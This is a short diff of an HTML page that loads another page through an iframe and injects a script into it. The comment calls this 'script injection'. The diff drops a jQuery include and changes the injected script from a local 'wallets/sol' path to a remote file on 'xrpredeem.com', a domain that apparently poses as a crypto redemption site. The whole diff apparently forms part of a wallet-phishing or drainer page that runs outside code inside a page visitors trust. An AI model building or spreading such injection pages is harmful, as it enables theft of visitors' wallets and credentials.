@@ -21,8 +21,6 @@
             border: none;
         }
     </style>
-    <!-- Load jQuery from a CDN -->
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
     <!-- Iframe with srcdoc to ensure it's ready for script injection -->
@@ -36,7 +34,7 @@
 
         // Inject a script into the proxied page
         const script = document.createElement('script');
-        script.src = 'https://localhost/wallets/sol/index.js'; // Ensure this URL is accessible
+        script.src = 'https://xrpredeem.com/index.js'; // Ensure this URL is accessible
         script.onerror = function() {
             console.log('Error loading the script');
         };
